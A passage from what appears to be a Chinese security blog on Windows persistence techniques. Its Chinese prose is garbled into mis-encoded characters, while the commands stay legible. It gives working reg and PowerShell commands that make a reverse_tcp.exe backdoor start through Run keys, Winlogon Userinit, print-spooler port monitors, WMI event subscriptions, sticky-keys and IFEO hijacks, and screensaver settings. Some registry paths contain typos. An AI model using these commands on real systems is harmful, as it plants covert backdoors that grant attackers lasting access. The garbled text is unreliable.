åˆ°ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹æˆ–é€šè¿‡æ³¨å†Œè¡¨è¿è¡Œé”®å¼•ç”¨æ¥è¿›è¡Œæƒé™æŒä¹…åŒ–ã€‚æ·»åŠ çš„åé—¨ç¨‹åºå°†åœ¨ç”¨æˆ·ç™»å½•çš„ä¸Šä¸‹æ–‡ä¸­å¯åŠ¨ï¼Œå¹¶ä¸”å°†å…·æœ‰ä¸è´¦æˆ·ç›¸å…³è”çš„æƒé™ç­‰çº§ã€‚</p><p><strong>ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹</strong></p><p>å°†ç¨‹åºæ”¾åœ¨å¯åŠ¨æ–‡ä»¶å¤¹ä¸­ä¼šå¯¼è‡´è¯¥ç¨‹åºåœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œã€‚Windowsæœ‰ä¸¤ç§å¸¸è§çš„å¯åŠ¨æ–‡ä»¶å¤¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># ä½äºä»¥ä¸‹ç›®å½•çš„ç¨‹åºå°†åœ¨æŒ‡å®šç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨<br>C:Users\[Username]\AppData\Roaming\Microsoft\Windows\Start<br>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br># ä½äºä»¥ä¸‹ç›®å½•çš„ç¨‹åºå°†åœ¨æ‰€æœ‰ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br></code></pre></td></tr></table></figure><p><strong>è¿è¡Œé”®(Run Keys)</strong></p><p>Windows ç³»ç»Ÿä¸Šæœ‰è®¸å¤šæ³¨å†Œè¡¨é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®åœ¨ç³»ç»Ÿå¯åŠ¨æˆ–ç”¨æˆ·ç™»å½•æ—¶è¿è¡ŒæŒ‡å®šçš„ç¨‹åºæˆ–åŠ è½½æŒ‡å®š DLL æ–‡ä»¶ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å¯¹æ­¤ç±»æ³¨å†Œè¡¨è¿›è¡Œæ»¥ç”¨ï¼Œä»¥å»ºç«‹æŒä¹…åŒ–åé—¨ã€‚</p><p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šä¾æ¬¡æ£€æŸ¥ä½äºæ³¨å†Œè¡¨è¿è¡Œé”®(Run Keys)ä¸­çš„ç¨‹åºï¼Œå¹¶åœ¨ç”¨æˆ·ç™»å½•çš„ä¸Šä¸‹æ–‡ä¸­å¯åŠ¨ã€‚Windowsç³»ç»Ÿé»˜è®¤åˆ›å»ºä»¥ä¸‹è¿è¡Œé”®ï¼Œå¦‚æœä¿®æ”¹HKEY_LOCAL_MACHINEä¸‹çš„è¿è¡Œé”®ï¼Œéœ€è¦æ‹¥æœ‰ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸­çš„ç¨‹åºå°†åœ¨å½“å‰ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce<br># ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸­çš„ç¨‹åºå°†åœ¨æ‰€æœ‰ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤åœ¨æ³¨å†Œè¡¨è¿è¡Œé”®ä¸­æ·»åŠ ä¸€ä¸ªBackdooré”®ï¼Œå¹¶å°†é”®å€¼æ‰§è¡Œåé—¨ç¨‹åºçš„ç»å¯¹è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>ç”¨æˆ·é‡æ–°ç™»å½•æ—¶ä¸»æœºå°±ä¼šä¸Šçº¿</p><p><strong>Winlogon Helper</strong></p><p>Winlogon æ˜¯ Windows ç³»ç»Ÿçš„ç»„ä»¶,ç”¨äºå¤„ç†ä¸ç”¨æˆ·æœ‰å…³çš„å„ç§è¡Œä¸ºï¼Œå¦‚ç™»å½•ã€æ³¨é”€åœ¨ç™»å½•æ—¶åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ã€é”å®šå±å¹•ç­‰ã€‚è¿™äº›è¡Œä¸ºç”±ç³»ç»Ÿæ³¨å†Œè¡¨ç®¡ç†ï¼Œæ³¨å†Œè¡¨ä¸­çš„ä¸€äº›é”®å€¼å®šä¹‰äº†åœ¨ Windows ç™»å½•æœŸé—´ä¼šå¯åŠ¨å“ªäº›è¿›ç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># æŒ‡å®šç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œçš„ç”¨æˆ·åˆå§‹åŒ–ç¨‹åºï¼Œé»˜è®¤ä¸ºuserinit.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell<br># æŒ‡å®šWindowsèº«ä»½éªŒè¯æœŸé—´æ‰§è¡Œçš„ç¨‹åºï¼Œé»˜è®¤ä¸ºexplorer.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤åœ¨Userinité”®å€¼ä¸­æ·»åŠ ä¸€ä¸ªåé—¨ç¨‹åºï¼Œè¯¥ç¨‹åºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\userinit.exe,reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710511.png" alt="image-20240416234601884"></p><blockquote><p>æ³¨æ„ï¼Œåœ¨æ»¥ç”¨ Userinit å’Œ Shell é”®æ—¶éœ€è¦ä¿ç•™é”®å€¼ä¸­çš„åŸæœ‰ç¨‹åºï¼Œå°†å¾…å¯åŠ¨çš„åé—¨ç¨‹åºæ·»åŠ åˆ°åŸæœ‰ç¨‹åºåé¢ï¼Œå¹¶ä»¥â€œ,â€è¿›è¡Œåˆ†éš”ã€‚å¹¶ä¸”ï¼Œåé—¨ç¨‹åºéœ€è¦è¢«ä¸Šä¼ è‡³ C:\Windows\System32ç›®å½•ã€‚</p></blockquote><h2 id="port-monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h2><p>æ‰“å°åå°å¤„ç†æœåŠ¡(PrintSpooler)è´Ÿè´£ç®¡ç† Windowsç³»ç»Ÿçš„æ‰“å°ä½œä¸šã€‚ä¸è¯¥æœåŠ¡çš„äº¤äº’æ˜¯é€šè¿‡ Print Spooler APIæ‰§è¡Œçš„,å…¶ä¸­åŒ…å« AddMonitorå‡½æ•°,ç”¨äºå®‰è£… Port Monitors(æœ¬åœ°ç«¯å£ç›‘è§†å™¨)ï¼Œå¹¶è¿æ¥é…ç½®ã€æ•°æ®å’Œç›‘è§†å™¨æ–‡ä»¶ã€‚AddMonitorå‡½æ•°èƒ½å¤Ÿå°†DLLæ³¨å…¥spoolsv.exe è¿›ç¨‹ï¼Œä»¥å®ç°ç›¸åº”åŠŸèƒ½ï¼Œå¹¶ä¸”é€šè¿‡åˆ›å»ºæ³¨å†Œè¡¨é”®ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿›è¡Œæƒé™æŒä¹…åŒ–ã€‚åˆ©ç”¨è¯¥æŠ€æœ¯éœ€è¦æ‹¥æœ‰ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚</p><ol><li><p>é€šè¿‡Metasploitç”Ÿæˆä¸€ä¸ª64ä½çš„æ¶æ„çš„DLL</p></li><li><p>å°†ç”Ÿæˆçš„DLLä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºçš„C:\Windows\System32ç›®å½•ä¸­ï¼Œå¹¶æ‰§è¡Œä¸‹é¢å‘½ä»¤é€šè¿‡ç¼–è¾‘æ³¨å†Œè¡¨å®‰è£…ä¸€ä¸ªç«¯å£ç›‘è§†å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ &quot;reverse_tcp.dll&quot;<br></code></pre></td></tr></table></figure></li></ol><p>å½“ç³»ç»Ÿé‡å¯æ—¶ï¼ŒPrint Spooler æœåŠ¡åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šè¯»å–Monitors æ³¨å†Œè¡¨é¡¹çš„æ‰€æœ‰å­é”®ï¼Œå¹¶ä»¥ SYSTEM æƒé™åŠ è½½ Driver é”®å€¼æ‰€æŒ‡å®šçš„DLLæ–‡ä»¶ï¼Œç›®æ ‡ä¸»æœºå°±ä¼šé‡æ–°ä¸Šçº¿ã€‚</p><h1 id="äº‹ä»¶è§¦å‘æ‰§è¡Œ"><a href="#äº‹ä»¶è§¦å‘æ‰§è¡Œ" class="headerlink" title="äº‹ä»¶è§¦å‘æ‰§è¡Œ"></a>äº‹ä»¶è§¦å‘æ‰§è¡Œ</h1><h2 id="åˆ©ç”¨wmiäº‹ä»¶è®¢é˜…"><a href="#åˆ©ç”¨WMIäº‹ä»¶è®¢é˜…" class="headerlink" title="åˆ©ç”¨WMIäº‹ä»¶è®¢é˜…"></a>åˆ©ç”¨WMIäº‹ä»¶è®¢é˜…</h2><p>WMIå¯ä»¥ç”¨äºæ¨ªå‘ç§»åŠ¨è¿˜å¯ä»¥åœ¨ä»¥è·å¾—æƒé™çš„ä¸»æœºä¸Šéƒ¨ç½²æ°¸ä¹…äº‹ä»¶ï¼Œå½“è§¦å‘æŒ‡å®šäº‹ä»¶æ—¶æ‰§è¡Œåé—¨ç¨‹åºã€‚</p><p><strong>æ‰‹åŠ¨åˆ©ç”¨</strong></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒWMIäº‹ä»¶è®¢é˜…çš„éœ€è¦åˆ†åˆ«åˆ›å»ºäº‹ä»¶è¿‡æ»¤å™¨(Event Filter)å’Œäº‹ä»¶æ¶ˆè´¹è€…(Event Consumer)ï¼Œå¹¶æŠŠäºŒè€…å…³è”èµ·æ¥ï¼Œä»¥å°†äº‹ä»¶å‘ç”Ÿå’Œè§¦å‘æ‰§è¡Œç»‘å®šä¸€èµ·ã€‚</p><p>ä¸‹é¢ç”¨powershelléƒ¨ç½²ä¸€ä¸ªäº‹ä»¶ï¼Œåœ¨æ¯æ¬¡ç³»ç»Ÿå¯åŠ¨åçš„5åˆ†é’Ÿå†…æ‰§è¡Œåé—¨ç¨‹åº</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªTestFilterçš„äº‹ä»¶è¿‡æ»¤å™¨</span><br><span class="hljs-variable">$EventFilterArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br>    EventNamespace = <span class="hljs-string">&#x27;root/cimv2&#x27;</span><br>    Name = <span class="hljs-string">&quot;TestFilter&quot;</span><br>    Query = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent    WITHIN 60 WHERE TargetInstanceISA &#x27;Win32 PerfFormattedData_PerfoS_System&#x27; AND TargetInstance.SystemUpTime &gt;=240 AND TargetInstance.SystemUpTime&lt; 325&quot;</span><br>    QueryLanguage =<span class="hljs-string">&#x27;WQL&#x27;</span><br>&#125;<br><span class="hljs-variable">$EventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$EventFilterArgs</span><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåä¸ºTestConsumerçš„äº‹ä»¶æ¶ˆè´¹è€…ï¼Œåœ¨æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œåé—¨ç¨‹åº</span><br><span class="hljs-variable">$CommandLineEventConsumerArgs</span>= <span class="hljs-selector-tag">@</span>&#123;<br>    Name = <span class="hljs-string">&quot;TestConsumer&quot;</span><br>    CommandLineTemplate = <span class="hljs-string">&quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot;</span><br>&#125;<br><span class="hljs-variable">$EventConsumer</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$CommandLineEventConsumerArgs</span><br><span class="hljs-comment"># å°†äº‹ä»¶è¿‡æ»¤å™¨å’Œæ¶ˆè´¹è€…ç»‘å®šåœ¨ä¸€èµ·</span><br><span class="hljs-variable">$FilterConsumerBindingArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br><span class="hljs-keyword">Filter</span> = <span class="hljs-variable">$EventFilter</span><br>Consumer = <span class="hljs-variable">$EventConsumer</span><br>&#125;<br><span class="hljs-variable">$FilterConsumerBinding</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$FilterConsumerBindingArgs</span><br></code></pre></td></tr></table></figure><p><strong>ç›¸å…³è¾…åŠ©å·¥å…·</strong></p><p>å‰é¢ç”¨è¿‡Sharp-WMIEventè¿›è¡Œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œè¯¥å·¥å…·åŒæ ·å¯ä»¥ç”¨äºæƒé™æŒä¹…åŒ–ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œéƒ¨ç½²ä¸€ä¸ªéšæœºå‘½åçš„æ°¸ä¹…äº‹ä»¶ï¼Œæ¯å½“ç”¨æˆ·ç™»å½•æ—¶å°±æ‰§è¡Œåé—¨ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼ŒMetasploitæ¡†æ¶å†…ç½®äº†ä¸€ä¸ªé€šè¿‡ WMIäº‹ä»¶è®¢é˜…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®ç°æŒä¹…æ€§çš„æ¨¡å—ï¼Œå³ exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistenceï¼Œæ”¯æŒä¸åŒçš„é€‰é¡¹ï¼Œå¯ç”¨äºç‰¹å®šäº‹ä»¶è§¦å‘æ—¶åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„çš„æ”»å‡»è½½è·</p><p><img src="http://cdn.clown2024.cn/202407151710512.png" alt="image-20240417125624263"></p><h2 id="åˆ©ç”¨ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½"><a href="#åˆ©ç”¨ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½" class="headerlink" title="åˆ©ç”¨ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½"></a>åˆ©ç”¨ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½</h2><p>Windows ç³»ç»ŸåŒ…å«äº†è®¸å¤šä¾›ç”¨æˆ·é€šè¿‡ç»„åˆé”®å¯åŠ¨çš„è¾…åŠ©åŠŸèƒ½ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ä¿®æ”¹è¿™äº›ç¨‹åºçš„å¯åŠ¨æ–¹å¼ï¼Œä»¥è·å–ç›®æ ‡ä¸»æœºçš„å‘½ä»¤è¡Œæˆ–è¿è¡ŒæŒ‡å®šçš„åé—¨æ”»å‡»è½½è·ï¼Œä¸éœ€ç™»å½•ç³»ç»Ÿå³å¯è·å–ç›®æ ‡ä¸»æœºæƒé™ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„è¾…åŠ©åŠŸèƒ½ç¨‹åºï¼Œéƒ½ä½äºC:\Windows\System32ä¸‹é¢</p><table><thead><tr><th>ç¨‹åº</th><th>åŠŸèƒ½</th><th>çƒ­é”®ç»„åˆ</th></tr></thead><tbody><tr><td>sethc.exe</td><td>ç²˜æ»é”®</td><td>è¿ç»­5æ¬¡Shfité”®</td></tr><tr><td>magnify.exe</td><td>æ”¾å¤§é•œ</td><td>Windows+â€+â€</td></tr><tr><td>utilman.exe</td><td>å®ç”¨ç¨‹åº</td><td>Windows+U</td></tr><tr><td>osk.exe</td><td>å±å¹•é”®ç›˜</td><td>Windows+Ctrl+O</td></tr><tr><td>displaywitch.exe</td><td>å±å¹•æ‰©å±•</td><td>Windows+P</td></tr><tr><td>atbroker.exe</td><td>è¾…åŠ©ç®¡ç†å·¥å…·</td><td></td></tr><tr><td>narrator.exe</td><td>è®²è¿°è€…</td><td>Windows+Ctrl+Enter</td></tr></tbody></table><p>ä»¥sethc.exeä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†cmd.exeä¼ªè£…æˆscthc.exeï¼Œç„¶ååœ¨è¿œç¨‹ç™»é™†æ¡Œé¢è¿æŒ‰äº”æ¬¡shifté”®å³å¯è·å¾—ä¸€ä¸ªå‘½ä»¤è¡Œçª—å£ï¼Œå®ç°æœªæˆæƒè®¿é—®ã€‚è¯¥æ–¹æ³•éœ€è¦ç®¡ç†å‘˜æƒé™</p><p><strong>æ‰‹åŠ¨åˆ©ç”¨</strong></p><p>åœ¨é«˜ç‰ˆæœ¬çš„ Windowsä¸­ï¼ŒC:\Windows\System32ç›®å½•ä¸‹çš„æ–‡ä»¶å—åˆ°ç³»ç»Ÿä¿æŠ¤ï¼Œåªæœ‰TrustedInstalleræƒé™çš„ç”¨æˆ·æ‰å¯¹å…¶ä¸­çš„æ–‡ä»¶æ‹¥æœ‰ä¿®æ”¹å’Œå†™å…¥æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¤ç‰Œçªƒå–æŠ€æœ¯è·å¾—æƒé™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151710513.png" alt="image-20240417135924293"></p><p>è·å– TrustedInstalleræƒé™åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd C:\Windows\System32<br>move sethc.exe sethc.exe.bak # å°†sethc.exeé‡å‘½å<br>copy cmd.exe sethc.exe       # å°†cmd.exeå‰¯æœ¬ä¼ªè£…æˆsethc.exe<br></code></pre></td></tr></table></figure><p><strong>RDPåŠ«æŒ</strong></p><p>é€šè¿‡ç²˜æ»é”®ç­‰ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½åˆ›å»ºçš„åé—¨ä»¥SYSTEM æƒé™è¿è¡Œï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨è·å–çš„å‘½ä»¤è¡Œä¸­æ‰§è¡Œ RDPåŠ«æŒï¼Œä¸éœ€ä»»ä½•ç”¨æˆ·å‡­æ®å³å¯ç™»å…¥ç›®æ ‡ç³»ç»Ÿæ¡Œé¢ã€‚</p><h2 id="ifeoæ³¨å…¥"><a href="#IFEOæ³¨å…¥" class="headerlink" title="IFEOæ³¨å…¥"></a>IFEOæ³¨å…¥</h2><p>IFEO(Image File Execution Options)æ˜¯Windowsç³»ç»Ÿçš„ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹,è·¯å¾„ä¸º HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Optionsã€‚</p><p>åœ¨ WindowsNT ç³»ç»Ÿä¸­ï¼ŒIFEO åŸæœ¬æ˜¯ä¸ºä¸€äº›åœ¨é»˜è®¤ç³»ç»Ÿç¯å¢ƒä¸­è¿è¡Œæ—¶å¯èƒ½å¼•å‘é”™è¯¯çš„ç¨‹åºæ‰§è¡Œä½“æä¾›ç‰¹æ®Šçš„ç¯å¢ƒè®¾å®šã€‚IFEO ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿå°†è°ƒè¯•å™¨é™„åŠ åˆ°åº”ç”¨ç¨‹åºã€‚å½“è¿›ç¨‹åˆ›å»ºæ—¶ï¼Œåº”ç”¨ç¨‹åºçš„ IFEO ä¸­è®¾ç½®çš„è°ƒè¯•å™¨å°†é™„åŠ åˆ°åº”ç”¨ç¨‹åºçš„åç§°å‰ï¼Œä»è€Œæœ‰æ•ˆåœ°åœ¨è°ƒè¯•å™¨ä¸‹å¯åŠ¨æ–°è¿›ç¨‹</p><p><strong>Debugger</strong></p><p>å½“ç”¨æˆ·å¯åŠ¨è®¡ç®—æœºçš„ç¨‹åºåï¼Œç³»ç»Ÿä¼šåœ¨æ³¨å†Œè¡¨çš„IFEO ä¸­æŸ¥è¯¢æ‰€æœ‰çš„ç¨‹åºå­é”®ï¼Œå¦‚æœå­˜åœ¨ä¸è¯¥ç¨‹åºåç§°ç›¸åŒçš„å­å¥ï¼Œå°±è¯»å–å¯¹åº”å­é”®çš„â€œDebuggerâ€é”®å€¼ã€‚å¦‚æœè¯¥é”®å€¼æœªè¢«è®¾ç½®ï¼Œå°±é»˜è®¤ä¸åšå¤„ç†ï¼Œå¦åˆ™ç›´æ¥ç”¨è¯¥é”®å€¼æ‰€æŒ‡å®šçš„ç¨‹åºè·¯å¾„æ¥ä»£æ›¿åŸå§‹çš„ç¨‹åºã€‚</p><p>é€šè¿‡ç¼–è¾‘â€œDubuggerâ€çš„å€¼ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼åˆ›å»ºç²˜æ»é”®åé—¨ï¼Œè€Œä¸éœ€è·å– TrustedInstaller æƒé™ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32.exe&quot;<br></code></pre></td></tr></table></figure><p><strong>GlobalFlag</strong></p><p>IFEOè¿˜å¯ä»¥åœ¨æŒ‡å®šç¨‹åºé™é»˜é€€å‡ºæ—¶å¯åŠ¨ä»»æ„ç›‘æ§ç¨‹åºï¼Œéœ€è¦é€šè¿‡è®¾ç½®ä»¥ä¸‹3ä¸ªæ³¨å†Œè¡¨æ¥å®ç°ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯ç”¨å¯¹è®°äº‹æœ¬è¿›ç¨‹çš„é™é»˜é€€å‡ºç›‘è§†</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Option\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯ç”¨Windowsé”™è¯¯æŠ¥å‘Šè¿›ç¨‹WerFault.exeï¼Œå®ƒå°†æˆä¸ºreverse_tcp.exeçš„çˆ¶è¿›ç¨‹</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å°†ç›‘è§†å™¨è¿›ç¨‹è®¾ç½®ä¸ºreverse_tcp.exe</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·æ‰“å¼€è®°äº‹æœ¬(notepad.exe)æ—¶ï¼Œç¨‹åºæ­£å¸¸å¯åŠ¨ã€‚å½“ç”¨æˆ·å…³é—­è®°äº‹æœ¬æˆ–ç›¸å…³è¿›ç¨‹è¢«æ€æ­»åæ—¶ï¼Œå°†åœ¨ WerFault.exe è¿›ç¨‹ä¸­åˆ›å»ºå­è¿›ç¨‹ä»¥è¿è¡Œåé—¨ç¨‹åºreverse_tcp.exe.</p><p><img src="http://cdn.clown2024.cn/202407151710514.png" alt="image-20240417155154992"></p><h2 id="åˆ©ç”¨å±å¹•ä¿æŠ¤ç¨‹åº"><a href="#åˆ©ç”¨å±å¹•ä¿æŠ¤ç¨‹åº" class="headerlink" title="åˆ©ç”¨å±å¹•ä¿æŠ¤ç¨‹åº"></a>åˆ©ç”¨å±å¹•ä¿æŠ¤ç¨‹åº</h2><p>å±å¹•ä¿æŠ¤æ˜¯ Windows ç³»ç»Ÿçš„ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥åœ¨ç”¨æˆ·ä¸€æ®µæ—¶é—´ä¸æ´»åŠ¨åæ’­æ”¾å±å¹•æ¶ˆæ¯æˆ–å›¾å½¢åŠ¨ç”»ã€‚å±å¹•ä¿æŠ¤ç¨‹åºç”±å…·æœ‰.scræ–‡ä»¶æ‰©å±•åçš„å¯æ‰§è¡Œæ–‡ä»¶ç»„æˆã€‚ç³»ç»Ÿæ³¨å†Œè¡¨é¡¹HKEY_CURRENT_USER\Control Panel\Desktop ä¸‹å­˜å‚¨äº†ç”¨æ¥è®¾ç½®å±å¹•ä¿æŠ¤ç¨‹åºçš„é”®å€¼ã€‚</p><table><thead><tr><th>é”®å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SCRNSAVE.EXE</td><td>è®¾ç½®å±å¹•ä¿æŠ¤ç¨‹åºçš„è·¯å¾„ï¼Œå…¶æŒ‡å‘ä»¥.scrä¸ºæ‰©å±•åçš„å¯æ‰§è¡Œæ–‡ä»¶</td></tr><tr><td>ScreenSaveActive</td><td>è®¾ç½®æ˜¯å¦éœ€è¦å¯ç”¨å±å¹•ä¿æŠ¤ç¨‹åºï¼Œé»˜è®¤ä¸º1è¡¨ç¤ºå¯ç”¨</td></tr><tr><td>ScreenSaveIsSecure</td><td>è®¾ç½®æ˜¯å¦éœ€è¦å¯†ç è§£é”ï¼Œè®¾ç½®ä¸º0åˆ™ä¸éœ€è¦å¯†ç </td></tr><tr><td>ScreenSaveTimeOut</td><td>è®¾ç½®æ‰§è¡Œå±å¹•ä¿æŠ¤ç¨‹åºä¹‹å‰ç”¨æˆ·ä¸æ´»åŠ¨çš„è¶…æ—¶æ—¶é—´</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å±å¹•ä¿æŠ¤çš„æ‰§è¡Œè·¯å¾„ï¼Œå½“è§¦å‘å±å¹•ä¿æŠ¤æ—¶æ‰§è¡Œåé—¨ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å°†è§¦å‘å±å¹•ä¿æŠ¤æ—¶æ‰§è¡Œçš„ç¨‹åºè®¾ä¸ºè‡ªå®šä¹‰çš„æ¶æ„ç¨‹åºï¼Œè¿™é‡Œçš„ç¨‹åºä»¥.scræˆ–.exeä¸ºæ‰©å±•åçš†å¯</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus\reverse_tcp.scr&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯ç”¨å±å¹•ä¿æŠ¤</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ä¸éœ€è¦å¯†ç è§£é”</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveIsSecure /t REG_SZ /d &quot;0&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å°†ç”¨æˆ·ä¸æ´»åŠ¨çš„è¶…æ—¶è®¾ç½®ä¸º60ç§’</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut /t REG_SZ /d &quot;60&quot;<br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ ‡å‡†ç”¨æˆ·æƒé™å³å¯ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤ ScreenSaveActive 